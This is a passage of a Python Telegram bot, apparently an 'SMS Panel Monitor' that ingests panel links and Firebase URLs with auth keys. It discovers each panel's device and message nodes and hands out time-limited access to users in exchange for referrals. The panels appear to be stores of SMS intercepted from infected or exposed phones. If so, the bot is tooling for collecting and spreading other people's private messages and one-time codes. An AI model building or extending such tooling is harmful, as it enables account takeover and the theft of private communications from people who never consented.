                        device_ids, error = await get_device_list(
                            client, api_url, auth_key, dev_node
                        )
                        if error:
                            status = f"🔴 {error[:25]}"
                        else:
                            device_count   = len(device_ids)
                            total_devices += device_count
                            status = "🟢 Active" if device_count > 0 else "🟡 No Devices"
                    else:
                        status = "🔴 Structure Error"
                except Exception as e:
                    status = f"🔴 {str(e)[:25]}"

            text += f"*{panel_name}*\nStatus: {status} | Devices: {device_count}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    now          = time.time()
    active_users = sum(
        1 for uid_s, u in users.items()
        if int(uid_s) in ADMIN_IDS or u.get("access_expiry", 0) > now
    )
    text += f"\n📦 Total Devices: {total_devices}\n👥 Total Users: {len(users)} | Active: {active_users}"
    await update.message.reply_text(text, parse_mode="Markdown")

# ── My panels (admin) ─────────────────────────────────────────────────────────
async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi hai.")
        return
    text = "📋 *My Panels*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, (pk, pc) in enumerate(panels.items(), 1):
        url_display = pc.get("panel_url", "")[:45]
        api_url     = pc.get("api_url", "")[:45]
        dev_node    = pc.get("device_node", "auto")
        msg_node    = pc.get("message_node", "auto")
        text += (
            f"*{i}. {pc.get('name')}*\n"
            f"   URL: `{url_display}...`\n"
            f"   API: `{api_url}...`\n"
            f"   Dev: `{dev_node}` | Msg: `{msg_node}`\n\n"
        )
    await update.message.reply_text(text, parse_mode="Markdown")

# ── Add panel (admin) ─────────────────────────────────────────────────────────
async def handle_add_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    await update.message.reply_text(
        "➕ *Add New Panels*\n\n"
        "Links bhejein (har link nayi line par).\n\n"
        "Supported formats — ANY of these:\n"
        "• Encoded: `http://profex.site.je/?s=...`\n"
        "• ZXKAI: `http://panel.site/?s=...`\n"
        "• Raw Firebase: `https://xxx-default-rtdb.firebaseio.com`\n"
        "• Firebase + auth: `https://xxx.firebaseio.com?auth=KEY`\n"
        "• Any web panel: `https://api.example.com/data`\n"
        "• Any URL with key: `https://site.com?apikey=XXX`\n\n"
        "_No format limit — any link works!_",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_url"] = True

# ── Remove panel (admin) ──────────────────────────────────────────────────────
async def handle_remove_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi hai.")
        return
    text        = "❌ *Remove Panel*\n\n"
    panels_list = []
    for i, (pk, pc) in enumerate(panels.items(), 1):
        text += f"{i}. {pc.get('name')}\n"
        panels_list.append(pk)
    text += "\nNumber bhejo."
    context.user_data["awaiting_remove"] = True
    context.user_data["panels_list"]     = panels_list
    await update.message.reply_text(text, parse_mode="Markdown")

# ── Give Time (admin) ─────────────────────────────────────────────────────────
async def handle_give_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    await update.message.reply_text(
        "⏱ *Give Access Time*\n\n"
        "Is format mein bhejo:\n"
        "`<user_id> <hours>`\n\n"
        "Example: `123456789 2`\n"
        "(2 ghante dega us user ko)\n\n"
        "User ID Users list mein milega 👥",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_give_time"] = True

# ── My Referral ───────────────────────────────────────────────────────────────
async def my_referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate_user(update, context.bot):
        return
    uid      = update.effective_user.id
    u        = get_user(uid)
    refs     = u.get("referrals_given", 0) if u else 0
    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
    next_milestone = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
    await update.message.reply_text(
        f"🔗 *Your Referral Info*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Referrals: *{refs}*\n"
        f"Next 1h access in: *{next_milestone}* more referral(s)\n\n"
        f"📲 Your Link:\n`{ref_link}`\n\n"
        f"ℹ️ Har 3 referrals = 1 ghante ka access!\n"
        f"Share karo aur access badhao 🚀",
        parse_mode="Markdown",
    )

# ── My Access ─────────────────────────────────────────────────────────────────
async def my_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = get_user(uid)

    if uid in ADMIN_IDS:
        await update.message.reply_text("♾ *Admin — Unlimited access!*", parse_mode="Markdown")
        return

    expiry = u.get("access_expiry", 0) if u else 0
    refs   = u.get("referrals_given", 0) if u else 0

    if expiry > time.time():
        remaining    = int(expiry - time.time())
        hours, rem   = divmod(remaining, 3600)
        mins         = rem // 60
        exp_str      = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        text = (
            f"✅ *Access Active*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Expires at: `{exp_str}`\n"
            f"Remaining: `{hours}h {mins}m`\n"
            f"Total referrals: `{refs}`"
        )
    else:
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        text = (
            f"⛔ *No Active Access*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Total referrals: `{refs}`\n"
            f"Aur *{needed}* referral(s) karo = 1 ghante ka access\n\n"
            f"Apna referral link pane ke liye /start karo."
        )
    await update.message.reply_text(text, parse_mode="Markdown")

# ── Users list (admin) ────────────────────────────────────────────────────────
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    users = load_users()
    now   = time.time()
    active = [
        (uid, u) for uid, u in users.items()
        if int(uid) in ADMIN_IDS or u.get("access_expiry", 0) > now
    ]
    text = (
        f"👥 *Users Overview*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total registered: {len(users)}\n"
        f"Active access: {len(active)}\n\n"
    )
    for uid_str, u in list(users.items())[:30]:
        uid_int = int(uid_str)
        uname   = u.get("username") or uid_str
        refs    = u.get("referrals_given", 0)
        if uid_int in ADMIN_IDS:
            acc = "👑 Admin"
        elif u.get("access_expiry", 0) > now:
            exp = datetime.fromtimestamp(u["access_expiry"]).strftime("%d/%m %H:%M")
            acc = f"✅ till {exp}"
        else:
            acc = "⛔ None"
        text += f"• `{uid_str}` @{uname} | refs:{refs} | {acc}\n"
    if len(users) > 30:
        text += f"\n...and {len(users)-30} more."
    await update.message.reply_text(text, parse_mode="Markdown")

# ── Broadcast (admin) ─────────────────────────────────────────────────────────
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    await update.message.reply_text(
        "📨 *Broadcast Message*\n\nMessage bhejo (sab active users ko jayega):",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_broadcast"] = True

# ── Text message router ───────────────────────────────────────────────────────
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    uid  = update.effective_user.id

    # ── Add panel flow ────────────────────────────────────────────────────────
    if context.user_data.get("awaiting_url"):
        context.user_data.pop("awaiting_url")
        if uid not in ADMIN_IDS:
            await update.message.reply_text("⛔ Admin only.")
            return

        links = [line.strip() for line in text.split("\n") if line.strip()]
        if not links:
            await update.message.reply_text("❌ Link nahi mila.")
            return

        panels        = load_panels()
        added         = 0
        dupes         = 0
        failed        = []
        existing_urls = {
            pc.get("api_url", "").rstrip("/").lower()
            for pc in panels.values()
        }

        async with httpx.AsyncClient() as client:
            for link in links:
                if not link.startswith("http"):
                    failed.append(link[:40])
                    continue
                api_url, auth_key = get_panel_api_url(link)
                if not api_url:
                    failed.append(link[:40])
                    continue

                normalised = api_url.rstrip("/").lower()
                if normalised in existing_urls:
                    dupes += 1
                    continue

                dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                if dev_node is None:
                    # Still add it — structure might be discovered later
                    dev_node = ""
                    msg_node = ""

                pid = f"p_{int(time.time())}_{added}_{len(panels)}"
                panels[pid] = {
                    "name":         f"Panel {len(panels)+1}",
                    "api_url":      api_url,
                    "auth_key":     auth_key,
                    "device_node":  dev_node if dev_node else None,
                    "message_node": msg_node,
                    "panel_url":    link,
                    "added_date":   datetime.now().strftime("%Y-%m-%d"),
                }
                existing_urls.add(normalised)
                added += 1

        save_panels(panels)
        msg = f"✅ *{added} panel(s) add ho gaye!*"
        if dupes:
            msg += f"\n⚠️ {dupes} duplicate(s) skip ho gaye"
        if failed:
            msg += f"\n❌ Failed ({len(failed)}):\n" + "\n".join(f"  • {f}" for f in failed)
        await update.message.reply_text(msg, parse_mode="Markdown")
        return

    # ── Remove panel flow ─────────────────────────────────────────────────────
    if context.user_data.get("awaiting_remove"):
        context.user_data.pop("awaiting_remove")
        plist = context.user_data.pop("panels_list", [])
        try:
            idx = int(text) - 1
            if 0 <= idx < len(plist):
                panels  = load_panels()
                removed = panels.pop(plist[idx])
                save_panels(panels)
                await update.message.reply_text(
                    f"✅ Panel '{removed.get('name')}' remove ho gaya!"
                )
            else:
                await update.message.reply_text("❌ Galat number!")
        except Exception:
            await update.message.reply_text("❌ Galat input!")
        return

    # ── Give time flow ────────────────────────────────────────────────────────
    if context.user_data.get("awaiting_give_time"):
        context.user_data.pop("awaiting_give_time")
        if uid not in ADMIN_IDS:
            return
        parts = text.strip().split()
        try:
            if len(parts) != 2:
                raise ValueError("Need exactly 2 values")
            target_id = int(parts[0])
            hours     = float(parts[1])
            if hours <= 0 or hours > 720:
                raise ValueError("Hours must be 1–720")

            target_u = get_user(target_id)
            if target_u is None:
                upsert_user(target_id)

            expiry  = grant_access_hours(target_id, hours)
            exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")

            await update.message.reply_text(
                f"✅ *Done!*\n\n"
                f"User `{target_id}` ko *{hours}h* access diya gaya.\n"
                f"Expires at: `{exp_str}`",
                parse_mode="Markdown",
            )
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=(
                        f"🎁 *Access Received!*\n\n"
                        f"Admin ne tumhe *{hours} ghante* ka access diya!\n"
                        f"Expires at: `{exp_str}`"
                    ),
                    parse_mode="Markdown",
                )
            except Exception:
                await update.message.reply_text(
                    "⚠️ User ko notify nahi kar paya (unhone bot start nahi kiya hoga)."
                )
        except ValueError as e:
            await update.message.reply_text(
                f"❌ Galat format!\n\n"
                f"Sahi format: `<user_id> <hours>`\n"
                f"Example: `123456789 2`",
                parse_mode="Markdown",
            )
        return

    # ── Broadcast flow ────────────────────────────────────────────────────────
    if context.user_data.get("awaiting_broadcast"):
        context.user_data.pop("awaiting_broadcast")
        if uid not in ADMIN_IDS:
            return
        sent   = 0
        failed = 0
        for target_uid in get_all_user_ids():
            try:
                await context.bot.send_message(
                    chat_id=target_uid, text=text,
                    parse_mode="Markdown", disable_web_page_preview=True,
                )
                sent += 1
            except Exception:
                failed += 1
        await update.message.reply_text(
            f"📨 *Broadcast done!*\n✅ Sent: {sent} | ❌ Failed: {failed}",
            parse_mode="Markdown",
        )
        return

    # ── Menu button routing ───────────────────────────────────────────────────
    if text in ("📊 Status", "Status"):
        await status_command(update, context)
    elif text in ("📋 My Panels", "My Panels"):
        await my_panels_command(update, context)
    elif text in ("➕ Add Panel", "Add Panel"):
        await handle_add_panel(update, context)
    elif text in ("❌ Remove Panel", "Remove Panel"):
        await handle_remove_panel(update, context)
    elif text in ("🔗 My Referral", "My Referral"):
        await my_referral_command(update, context)
    elif text in ("⏳ My Access", "My Access"):
        await my_access_command(update, context)
    elif text in ("👥 Users", "Users"):
        await users_command(update, context)
    elif text in ("📨 Broadcast", "Broadcast"):
        await broadcast_command(update, context)
    elif text in ("⏱ Give Time", "Give Time"):
        await handle_give_time(update, context)

# ── Main ──────────────────────────────────────────────────────────────────────
async def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

    application.job_queue.run_repeating(monitor_panels, interval=MONITOR_INTERVAL, first=5)

    logger.info("🤖 SMS Panel Monitor (Universal) starting...")
    async with application:
        await application.initialize()
        await application.start()
        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        while True:
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        logger.fatal(f"Fatal error: {e}")
